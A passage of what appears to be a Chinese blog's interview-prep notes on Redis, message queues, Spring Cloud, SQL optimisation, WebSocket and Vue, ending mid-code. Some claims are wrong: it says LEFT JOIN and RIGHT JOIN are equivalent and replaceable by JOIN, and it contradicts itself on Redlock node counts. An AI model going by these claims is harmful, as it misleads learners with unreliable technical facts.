title="七十三、Redis有哪些数据结构？分别常用于什么什么场景？"></a>七十三、Redis有哪些数据结构？分别常用于什么什么场景？</h3><ol><li>String：可以用来做最简单的数据，可以缓存某个简单的字符串，也可以缓存某个JSON字符串。Redis分布式锁的实现就利用了这种数据结构，还包括可以实现计数器、Session共享、分布式ID</li><li>Hash：可以用来存储一些key-value对，更适合储存对象</li><li>list：Redis的列表通过命令的组合，既可以当做栈，也可以做队列来使用，可以用来缓存类似微型公众号、微博等消息流数据</li><li>set：和list类似，也可以存储多个元素，但是不能重复，集合可以进行并集、交集、差集等操作，从而实现我和某人共同关注的人，朋友圈点赞等功能</li><li>zset：有序集合，可以用来作排行榜</li></ol><h3 id="七十四、Redis分布式锁底层是如何实现的"><a href="#七十四、Redis分布式锁底层是如何实现的" class="headerlink" title="七十四、Redis分布式锁底层是如何实现的"></a>七十四、Redis分布式锁底层是如何实现的</h3><ol><li>首先利用setnx来保证：如果key不存在才能获取到锁，如果key存在则获取不到锁</li><li>然后利用lua脚本来保证多个Redis操作的原子性</li><li>同时还要考虑到锁过期，所以需要额外的一个看门狗定时任务来监听锁是否需要续约</li><li>同时还要考虑redis节点挂掉后的情况，所以需要采用红锁的方式来同时向N/2+1个节点申请锁，都申请到才证明取锁成功，这样就算其中某个Redis节点挂掉，锁也不会被其他客户端获取到</li></ol><h3 id="七十五、Redis集群策略"><a href="#七十五、Redis集群策略" class="headerlink" title="七十五、Redis集群策略"></a>七十五、Redis集群策略</h3><ol><li>主从模式：主库可以读写，并且和从库进行数据同步，从库负责读操作。客户端直接连主库或者某个从库，但是主库或者从库宕机后，客户端需要手动改IP</li><li>哨兵模式：在主从机制上增加了哨兵节点。当主库节点宕机后，哨兵会发现主库宕机了，然后从从库中选一个作为主库</li><li>Cluster模式：用的最多，支持多主多从，这种模式会按照key进行槽位的分配，可以使得不同的key分散到不同的主节点上，利用这种模式可以使整个集群支持更大的数据容量，同时主节点可以拥有自己的多个从节点，如果该主节点宕机，他会从他的从节点中选举有个新的主节点</li></ol><h3 id="七十六、缓存穿透、缓存雪崩、缓存击穿分别是什么"><a href="#七十六、缓存穿透、缓存雪崩、缓存击穿分别是什么" class="headerlink" title="七十六、缓存穿透、缓存雪崩、缓存击穿分别是什么"></a>七十六、缓存穿透、缓存雪崩、缓存击穿分别是什么</h3><ol><li>缓存雪崩：如果缓存中某一时刻大批热点数据过期，那么就可能导致大量请求直接访问Mysql。解决办法就是在过期时间上增加一点随机值。另外，搭建一个高可用的Redis集群也可以防止</li><li>缓存击穿：和缓存雪崩类似，但是缓存击穿是某一个热点数据失效，导致大量请求直接访问Mysql数据库。解决方法是，考虑这个热点是否不设置过期时间</li><li>缓存穿透：假如某一时刻访问Redis的大量key都不在redis中（例如黑客故意伪造的key），那么也会给数据造成压力，这就是缓存穿透。解决方案是接口层增加校验，比如用户鉴权，ID做基础校验，比如id&lt;=0直接拦截。如果数据库里也拿不到该数据，可以将该key-value写成key-null，设置有效时间，可以防止攻击者使用同一个id反复攻击</li></ol><h3 id="七十七、Redis如何和Mysql保持数据一致"><a href="#七十七、Redis如何和Mysql保持数据一致" class="headerlink" title="七十七、Redis如何和Mysql保持数据一致"></a>七十七、Redis如何和Mysql保持数据一致</h3><ol><li>先更新Mysql，再更新Redis，如果更新Redis失败，可能仍然不一致</li><li>先删除Redis缓存数据，再更新Mysql，再查询的时候，将数据添加到缓存中，但是在高并发下，性能低下，而且还是会出现数据不一致</li><li>延时双删：先删除Redis缓存数据，再更新Mysql，延迟几百毫秒再删除Redis缓存数据，这样就算在更新Mysql时，其他线程读了Mysql，把老数据读到Mysql中也会被删掉，从而保证数据一致</li></ol><h3 id="七十八、Redis的优缺点"><a href="#七十八、Redis的优缺点" class="headerlink" title="七十八、Redis的优缺点"></a>七十八、Redis的优缺点</h3><p>优点：</p><ol><li>读写性能优异</li><li>支持数据持久化</li><li>支持主从复制，主机会自动将数据同步到从机，可以进行读写分离</li></ol><p>缺点：</p><ol><li>不具备自动容错和恢复功能，主机从机宕机都会导致前端部分读写请求失败。</li><li>主机宕机，可能导致部分数据没有同步到从机，切换IP后，还容易引起数据不一致</li><li>Redis艰难支持在线扩容，在集群容量达到上限时，在线扩容会非常复杂</li></ol><h3 id="七十九、CAP理论，BASE理论"><a href="#七十九、CAP理论，BASE理论" class="headerlink" title="七十九、CAP理论，BASE理论"></a>七十九、CAP理论，BASE理论</h3><p>CAP：一致性，可用性和分区容错性，三者只能同时满足两个</p><h3 id="八十五、Spring-Cloud有哪些常用组件，作用是什么"><a href="#八十五、Spring-Cloud有哪些常用组件，作用是什么" class="headerlink" title="八十五、Spring Cloud有哪些常用组件，作用是什么"></a>八十五、Spring Cloud有哪些常用组件，作用是什么</h3><ol><li><strong>Eureka：</strong>注册中心</li><li><strong>Nacos：</strong>注册中心、配置中心（阿里巴巴的）</li><li><strong>Consul：</strong>注册中心、配置中心</li><li><strong>Spring cloud config： </strong>配置中心</li><li><strong>Feign/OpenFeign：</strong>RPC调用（远程服务调用）</li><li><strong>zuul：</strong>服务网关</li><li><strong>Spring cloud gateway：</strong>服务网关</li><li><strong>Ribbon：</strong>负载均衡</li><li><strong>Spring cloud sleuth：</strong>链路追踪</li><li><strong>Zipkin：</strong>链路追踪</li><li><strong>seata：</strong>分布式事务</li><li><strong>Dubbo：</strong>RPC调用</li><li><strong>Sentinel：</strong>服务熔断</li><li><strong>Hystrix：</strong>服务熔断</li></ol><h3 id="八十六、RabbitMQ应用场景"><a href="#八十六、RabbitMQ应用场景" class="headerlink" title="八十六、RabbitMQ应用场景"></a>八十六、RabbitMQ应用场景</h3><ol><li>应用解耦：当要调用远程系统时，当存在订单系统和库存系统时，订单系统下单，库存系统需要收到订单后库存减一，这时候如果系统宕机，会造成订单丢失。但是把订单消息发入mq，库存系统再去mq消费，就能解决这个问题</li><li>异步消费：传统的模式：用户下单===&gt;邮件发送===&gt;短信提醒，三个步骤全部完成侧能返回用户消费成功，因为后面两个步骤完全没有当前就去完成，可以用户下单成功够，直接发送给mq，返回给用户消费成功，之后邮件发送和短信提醒，可以在其他时间段来消费法给用户</li><li>流量削峰：并发量非常高的时候，这时候数据库不能承受那么大的数据冲击，而专门为高并发设计的mq可以承受海量的请求，发送给mq，存储成功后再消费</li></ol><h3 id="八十七、什么是服务雪崩？什么是服务限流？"><a href="#八十七、什么是服务雪崩？什么是服务限流？" class="headerlink" title="八十七、什么是服务雪崩？什么是服务限流？"></a>八十七、什么是服务雪崩？什么是服务限流？</h3><ol><li>当服务A调用服务B，服务B调用服务C，此时大量的请求去请求服务A，假如服务A能抗住，但是服务C扛不住，导致大量的请求堆积，从而导致服务B请求堆积，从而服务A不可用，这就是服务雪崩。解决方法是服务降级和服务熔断</li><li>服务限流是指在高并发请求下，为保护系统，可以对访问服务的请求进行数量上的限制，从而防止系统不被大量请求压垮，在秒杀中，限流非常重要</li></ol><h3 id="八十八、什么是服务熔断？什么是服务降级？区别是什么？"><a href="#八十八、什么是服务熔断？什么是服务降级？区别是什么？" class="headerlink" title="八十八、什么是服务熔断？什么是服务降级？区别是什么？"></a>八十八、什么是服务熔断？什么是服务降级？区别是什么？</h3><ol><li>服务熔断是指，当服务A调用的某个服务B不可用时，上游服务A为了保证自己不受影响，从而不再调用服务B，直接返回一个结果，减轻服务A和服务B的压力，直到服务B恢复</li><li>服务降级指，当发现系统压力过载时，可以通过关闭某个服务，或者限流，某个服务来减轻系统压力</li></ol><p>相同点：</p><ol><li>都是为了防止系统崩溃</li><li>都是让用户体验到某些功能暂时不可用</li></ol><p>不同点：熔断是下游服务触发的，降级是降低系统负载</p><h3 id="八十九、kafka和RabbitMQ的区别"><a href="#八十九、kafka和RabbitMQ的区别" class="headerlink" title="八十九、kafka和RabbitMQ的区别"></a>八十九、kafka和RabbitMQ的区别</h3><ol><li>架构：RabbitMQ是一个消息代理，而Kafka是一个分布式流平台</li><li>实现：RabbitMQ基于队列模型，kafka基于发布/订阅模型</li><li>吞吐量：Kafka吞吐量远大于RabbitMQ，因为它具有分布式架构</li><li>持久性：Kafka消息储存更长</li><li>可靠性：RabbitMQ提供更高的可靠性，因为他支持事务和可靠性投递</li><li>用途：RabbitMQ用于异步通信和任务队列，Kafka适于大规模数据处理，和实时流数据</li></ol><p>九十、项目中怎么保证微服务敏捷开发</p><h3 id="九十一、如何进行消息队列选型"><a href="#九十一、如何进行消息队列选型" class="headerlink" title="九十一、如何进行消息队列选型"></a>九十一、如何进行消息队列选型</h3><p><strong>kafka：</strong></p><ol><li>优点：吞吐量大，性能非常好，集群高可用</li><li>缺点：会丢失数据，功能比较单一</li><li>使用场景：日志分析、大数据采集</li></ol><p><strong>RabbitMQ：</strong></p><ol><li>优点：消息可靠性高，功能全面</li><li>缺点：吞吐量低，消息积累会严重影响性能，erlang语言不好定制</li><li>使用场景：小规模场景</li></ol><p><strong>RocketMQ：</strong></p><ol><li>优点：高吞吐，高性能、高可用，功能全面</li><li>缺点：开源版本不如云上商业版，官方文档和周边生态不够成熟，客户端只支持java</li><li>使用场景：几乎是全场景</li></ol><h3 id="九十二、消息队列如何保证消息可靠性"><a href="#九十二、消息队列如何保证消息可靠性" class="headerlink" title="九十二、消息队列如何保证消息可靠性"></a>九十二、消息队列如何保证消息可靠性</h3><p>消息可靠传输代表两层意思，既不能多，也不能少。</p><ol><li>为了保证消息不多发，也就是消息不重复，也就是生产者不能重复生产消息，或者消费者不重复消费消息</li><li>首先要保证消息不多发，这个出现的比较少，也不好控制，因为出现了多发，很大原因是生产者自己的原因，如果要避免出现问题，就需要在消费端做控制</li><li>要避免不重复消费，最保险的机制就是消费者实现幂等性，保证就算重复消费，也不会有问题，通过幂等性，也能解决生产者重复发送消息的问题</li><li>消息不能少，意思就是消息不能丢，生产者发送的消息，消费者一定要消费到，对于这个问题，要考虑两个方面</li><li>生产者发送消息时，要确认broker确实收到并持久化了这条消息，比如RabbitMQ中的confirm机制，kafka的ack机制都可以保证生产者能正确的将消息发送给broker</li><li>broker要等待消费者真正确认消费到了消息时才能删掉信息，这里通常就是消费端的ack机制，消费者接收到一条消息后，如果确认没问题了，就可以给broker发送一个ack，broker接收到后才会删除消息</li></ol><h3 id="九十三、RabbitMQ的五种模式"><a href="#九十三、RabbitMQ的五种模式" class="headerlink" title="九十三、RabbitMQ的五种模式"></a>九十三、RabbitMQ的五种模式</h3><ol><li><p><strong>简单队列：</strong></p><p>一个生产者对应一个消费者</p></li><li><p><strong>work模式：</strong></p><p>一个生产者对应多个消费者，但是一条消息只有一个消费者可以获取消息</p></li><li><p><strong>发布/订阅模式：</strong></p><p>一个生产者将消息首先发送到交换器，交换器绑定到多个队列，然后被监听该队列的消费者所接受并消费</p></li><li><p><strong>路由模式：</strong></p><p>生产者将消息发送到direct交换器，在绑定队列和交换器的时候有一个路由key，生产者发送的消息会指定一个路由Key，那么消息只会发送到相应Key相同的队列，接着监听该队列的消费者消费信息</p><p><strong>也就是让消费者有选择性的接收消息</strong><br>路由模式，是以路由规则为导向，引导消息存入符合规则的队列中。再由队列的消费者进行消费的。</p></li><li><p><strong>主题模式：</strong></p><p>上面的路由模式是根据路由key进行完整的匹配（完全相等才发送消息），这里的通配符模式通俗的来讲就是模糊匹配。</p><p>符号“#”表示匹配一个或多个词，符号“*”表示匹配一个词。<br>　　与路由模式相似，但是，主题模式是一种模糊的匹配方式。</p></li></ol><h3 id="九十四、死信队列是什么？延时队列是什么？"><a href="#九十四、死信队列是什么？延时队列是什么？" class="headerlink" title="九十四、死信队列是什么？延时队列是什么？"></a>九十四、死信队列是什么？延时队列是什么？</h3><ol><li>死信队列也是一个消息队列，他是用来存那些没有成功消费的信息的，通常可以用作消息重试</li><li>延时队列就是用来存放需要在指定时间被处理的元素对队列，通常可以用来处理一些具有过期性操作的业务，比如十分钟内未支付取消订单</li></ol><h3 id="九十六、servlet的生命周期？"><a href="#九十六、servlet的生命周期？" class="headerlink" title="九十六、servlet的生命周期？"></a>九十六、servlet的生命周期？</h3><p>servlet有良好的生命周期定义，包括加载和实例化、初始化、处理请求以及服务结束四个阶段。WEB容器加载Servlet，生命周期开始，首先服务器调用Servlet的构造方法执行实例化操作，然后容器调用Servlet的init方法执行初始化操作，请求到达时运行Servlet的service方法，service方法自动调用与请求类型对应的doGet或者doPost方法来处理请求，当服务器决定将Servlet实例销毁前调用其destroy方法（释放servlet占用的资源，例如流、数据库连接等）</p><h3 id="九十七、跨域请求是什么？有什么问题？怎么解决？"><a href="#九十七、跨域请求是什么？有什么问题？怎么解决？" class="headerlink" title="九十七、跨域请求是什么？有什么问题？怎么解决？"></a>九十七、跨域请求是什么？有什么问题？怎么解决？</h3><p>跨域请求是指浏览器发起网络请求时，会检查该请求所对应的协议、域名、端口和当前网页是否一致，如果不一致则导致浏览器进行限制，比如在www.baidu.com的某个网页中，如果使用ajax去访问www.jd.com是不行的，但是如果是img、iframe、script等标签的src属性去访问则是可以的。之所以做这层限制，是为了用户信息安全。</p><p>解决方法：</p><ol><li>response添加header</li><li>jsonp的方式，该技术底层是基于script标签实现</li><li>后台自己控制</li><li>网关</li></ol><h3 id="九十八、乐观锁和悲观锁"><a href="#九十八、乐观锁和悲观锁" class="headerlink" title="九十八、乐观锁和悲观锁"></a>九十八、乐观锁和悲观锁</h3><ol><li><strong>悲观锁：</strong>每次去拿数据的时候都认为会进行修改，所以每次再拿数据的时候都会上锁。但是这样别人去拿数据就会被挡住，直到悲观锁释放。悲观锁中的共享资源每次只能给一个线程使用，其他线程阻塞，用完之后再把资源转让给其他线程。效率和并行性较低，还会增加死锁的风险。数据库中的行锁、表锁、读锁（共享锁）、写锁（排它锁），以及syncronized实现的锁均为悲观锁</li><li><strong>乐观锁：</strong> 每次去拿数据都认为不会修改，所以不会上锁，但是如果想要更新数据，则会在更新前检查在读取至更新这段时间别人有没修改过这个数据。如果修改过，就重新读取，然后尝试更新，循环上述步骤，直至更新成功。适用于多读的应用类型，可以提高吞吐量</li></ol><h1 id="SQL面试题"><a href="#SQL面试题" class="headerlink" title="SQL面试题"></a>SQL面试题</h1><h3 id="一、什么是分库分表？以及他的应用场景"><a href="#一、什么是分库分表？以及他的应用场景" class="headerlink" title="一、什么是分库分表？以及他的应用场景"></a>一、什么是分库分表？以及他的应用场景</h3><p>分库分表是一种数据库技术，它可以将数据库中的数据按照一定的规则进行分割，将数据存储到不同的数据库中，以提高数据库的<strong>性能</strong>和<strong>可用性</strong>。</p><p><strong>应用场景：</strong></p><ol><li>当<strong>数据量</strong>较大时，可以将数据分散到多个数据库中，以提高查询性能；</li><li>当<strong>数据库访问量</strong>较大时，可以将数据分散到多个数据库中，以提高访问性能；</li><li>当<strong>数据库容量较大</strong>时，可以将数据分散到多个数据库中，以提高存储性能。</li></ol><h3 id="二、left-join和right-join的区别"><a href="#二、left-join和right-join的区别" class="headerlink" title="二、left join和right join的区别"></a>二、left join和right join的区别</h3><p>LEFT JOIN和RIGHT JOIN的区别在于连接结果中左表和右表的位置不同。</p><p>LEFT JOIN会返回左表中的所有记录，即使右表中没有对应的匹配。如果右表中如果没有对应的匹配，右表的字段将被赋值为NULL。RIGHT JOIN则与之相反。</p><p>另外，在大部分数据库系统中，支持使用LEFT JOIN和RIGHT JOIN两种语句，并且两种操作是等价的，所以也可以使用 JOIN 替代LEFT JOIN 或 RIGHT JOIN</p><h3 id="三、数据库优化"><a href="#三、数据库优化" class="headerlink" title="三、数据库优化"></a>三、数据库优化</h3><ol><li><p><strong>架构优化：</strong> </p><ol><li><p><strong>分布式缓存：</strong>性能不够，缓存来凑。我们可以在应用于数据库之间加一个缓存服务，比如Redis。当收到查询请求后，我们先查询缓存，判断缓存中是否有数据，有数据则直接返回给应用，如若没有再查数据库。大大减少了对数据库的访问次数，自然提高了性能。</p><p>但是需要注意引入Redis之后的缓存穿透、缓存击穿和缓存雪崩</p></li><li><p><strong>读写分离：</strong>一主多从，读写分离，主动同步。一般来说，当你的应用是读多写少，数据库压力过大，采用读写分离，通过增加数据库量可以线性提升系统<strong>读</strong>性能**</p><p><strong>主库，提供数据库写服务；从库，提供数据库读能力；主从之间，通过binlog同步数据</strong></p><p>实施读写分离时，为了保证高可用，需要实现故障的自动转移，主从架构会有潜在主从不一致的问题</p></li><li><p><strong>分库分表（水平切分）：</strong>当你的应用业务数据量很大，单库容量成为性能瓶颈后，采用水平切分，可以降低数据库单库容量，提升数据库写性能。</p><p>当准备实施水平切分时，需要结合实际业务选取合理的分片键</p></li></ol></li><li><p><strong>硬件优化：</strong> 不管是读操作还是写操作，都是要访问磁盘，所以磁盘的性能决定了数据库的性能。用好的就行</p></li><li><p><strong>DB优化：</strong> SQL执行慢有时候不一定完全是SQL问题，手动安装一台数据库而不做任何参数调整，再怎么优化SQL都无法让其性能最大化。</p><p>基本遵循以下三点：日志不能小、缓存足够大、连接要够用</p></li><li><p><strong>SQL优化：</strong></p><ol><li><p><strong>合理使用索引:</strong></p><p>索引少了查询慢；索引多了占用空间大，执行增删改语句的时候需要动态维护索引，影响性能</p></li><li><p><strong>使用UNION ALL替代UNION：</strong></p><p>UNION ALL的执行效率比UNION高，因为UNION执行时需要排重；</p></li><li><p><strong>避免使用select :</strong></p><p>执行SQL时优化器需要将 * 转成具体的列；每次查询都要回表，不能走覆盖索引。</p></li><li><p><strong>JOIN字段建立索引</strong></p></li><li><p><strong>避免复杂的SQL语句:</strong></p><p>提升可阅读性；避免慢查询的概率；可以转换成多个短查询，用业务端处理</p></li><li><p><strong>避免where 1= 1写法</strong></p></li><li><p><strong>避免order by rand()类似写法:</strong></p><p>RAND()导致数据列被多次扫描</p></li></ol></li></ol><h3 id="四、怎么进行去重查询？"><a href="#四、怎么进行去重查询？" class="headerlink" title="四、怎么进行去重查询？"></a>四、<strong>怎么进行去重查询？</strong></h3><ol><li><p><strong>distinct：</strong>效率较低。不适合用来展示去重后具体的值，一般用于计算</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 列出 task_id 的所有唯一值（去重后的记录）</span></span><br><span class="line"><span class="comment">-- select distinct task_id</span></span><br><span class="line"><span class="comment">-- from Task;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 任务总数</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span> task_id) task_num</span><br><span class="line"><span class="keyword">from</span> Task;</span><br></pre></td></tr></table></figure></li></ol><ol><li><p><strong>group by ：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 列出 task_id 的所有唯一值（去重后的记录,null也是值）</span></span><br><span class="line"><span class="comment">-- select task_id</span></span><br><span class="line"><span class="comment">-- from Task</span></span><br><span class="line"><span class="comment">-- group by task_id;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 任务总数</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(task_id) task_num</span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> task_id</span><br><span class="line">      <span class="keyword">from</span> Task</span><br><span class="line">      <span class="keyword">group</span> <span class="keyword">by</span> task_id) tmp;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><ol><li><p><strong>row_number：</strong>窗口函数，用的比较少，因为必须先支持窗口函数才行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 在支持窗口函数的 sql 中使用</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">case</span> <span class="keyword">when</span> rn<span class="operator">=</span><span class="number">1</span> <span class="keyword">then</span> task_id <span class="keyword">else</span> <span class="keyword">null</span> <span class="keyword">end</span>) task_num</span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> task_id</span><br><span class="line">      , <span class="built_in">row_number</span>() <span class="keyword">over</span> (<span class="keyword">partition</span> <span class="keyword">by</span> task_id <span class="keyword">order</span> <span class="keyword">by</span> start_time) rn</span><br><span class="line">  <span class="keyword">from</span> Task) tmp;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h3 id="kafka相关知识点"><a href="#kafka相关知识点" class="headerlink" title="kafka相关知识点"></a>kafka相关知识点</h3><p>kafka是一种消息队列，主要用来处理大量数据状态下的消息队列，一般用来做日志处理</p><p>优点：</p><ol><li><p>解耦合：</p><p>耦合的状态表示当你实现新功能时，是直接接入当前接口，可以将相应消息发送到消息队列，这样的话，如果接口出问题，将不会影响到当前的功能</p></li><li><p>异步处理：</p><p>异步处理替代了之前的同步处理，异步处理不需让流程走完就返回结果，可以将消息发送到消息队列中，然后返回结果，剩下让其他业务处理，接口从消息队列中拉去消息处理即可</p></li><li><p>流量削峰</p><p>高流量的时候，使用消息队列作为中间件可以将流量的高峰保存在消息队列中，从而防止系统的高请求</p></li></ol><p>消费模式：</p><ol><li>一对一：消费者发布消息到Queue队列中，通知消费者从队列中拉取消息进行消费。消息消费后就删除，Queue支持多个消费者，但是一条消息只能被一个消费者消费</li><li>一对多：也叫发布/订阅模式，即利用Topic存储消息，消息生产者将消息发布到Topic中，同时有多个消费者订阅此Topic，消费者可以从中消费消息，注意，发布到Topic中的消息将会被多个消费者消费。消费者消费数据之后，数据不会被消除，kafka会默认保留一段时间，然后再删除</li></ol><h3 id="WebSocket是什么？应用场景"><a href="#WebSocket是什么？应用场景" class="headerlink" title="WebSocket是什么？应用场景"></a>WebSocket是什么？应用场景</h3><p>WebSocket是一种网络传输协议，位于OSI模型的应用层，可在单个TCP连接上进行全双工通信，能更好的节省服务器资源和带宽</p><p>客户端和服务器只需完成一次握手，两者就可以创建持久性的连接，并进行双向数据传输</p><p>优点：</p><ol><li>较少的开销：数据包头部协议较小，不同于HTTP每次请求都需要携带完整的头部</li><li>更强的实时性：相对于HTTP，延时更少</li><li>保持创连接状态：创建通信后，可省略状态信息，不同于HTTP每次请求需要携带身份验证</li><li>支持扩展：用户可以扩展webSocket协议，实现部分自定义的子协议</li></ol><p>缺点：</p><ol><li>各浏览器的支持度不同</li><li>服务器维持长连接的成本高</li><li>webSocket是长连接，受网络影响很大，需要处理好重连</li></ol><p>应用场景：</p><ol><li>弹幕</li><li>媒体聊天</li><li>协同编辑</li><li>基于位置的应用</li><li>体育实况</li><li>股票基金报价的实时更新</li></ol><h1 id="VUE面试题"><a href="#VUE面试题" class="headerlink" title="VUE面试题"></a>VUE面试题</h1><h3 id="一、nextTick"><a href="#一、nextTick" class="headerlink" title="一、nextTick"></a>一、nextTick</h3><p><code>nextTick</code> 是 Node.js 和浏览器中常用的一个异步方法，它可以将一个回调函数推迟到下一个事件循环中执行。</p><p>具体来说，<code>nextTick</code> 方法会将回调函数放到当前事件循环的末尾，等待当前事件循环完成后立即执行。这个过程是异步的，不会阻塞当前事件循环的执行。</p><p>在 Node.js 中，<code>process.nextTick</code> 方法是实现 <code>nextTick</code> 的一种方式。在浏览器中，<code>setTimeout</code> 方法也可以实现类似的功能，将延迟时间设置为 0 即可。</p><p>使用 <code>nextTick</code> 可以避免一些问题，比如在同步代码中修改了某个变量，但是在下一个事件循环中才需要使用这个变量的值，这时可以使用 <code>nextTick</code> 来确保变量已经被修改。</p><p>需要注意的是，由于 <code>nextTick</code> 是将回调函数放到当前事件循环的末尾执行，如果回调函数执行时间过长，会导致事件循环被阻塞，影响程序的性能。因此，在使用 <code>nextTick</code> 时，应该避免执行过长的回调函数。</p><h3 id="二、vue中组件传值"><a href="#二、vue中组件传值" class="headerlink" title="二、vue中组件传值"></a>二、vue中组件传值</h3><p>在 Vue 中，组件之间传值可以通过<strong>props</strong> 和 <strong>$emit</strong> 实现。</p><p>props 是父组件向子组件传递数据的一种方式。在父组件中使用子组件时，可以通过 v-bind 指令将数据绑定到子组件的 props 上。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">child-component</span> <span class="attr">:prop-name</span>=<span class="string">&quot;parentData&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">child-component</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">ChildComponent</span> <span class="keyword">from</span> <span class="string">&#x27;./ChildComponent.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">ChildComponent</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">parentData</span>: <span class="string">&#x27;Hello, child!&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在子组件中，可以通过 props 属性来接收父组件传递的数据。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; propName &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">props</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">propName</span>: <span class="title class_">String</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>$emit 是子组件向父组件传递数据的一种方式。在子组件中，可以通过 $emit 方法触发一个自定义事件，将数据传递给父组件。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;handleClick&quot;</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.$emit(<span 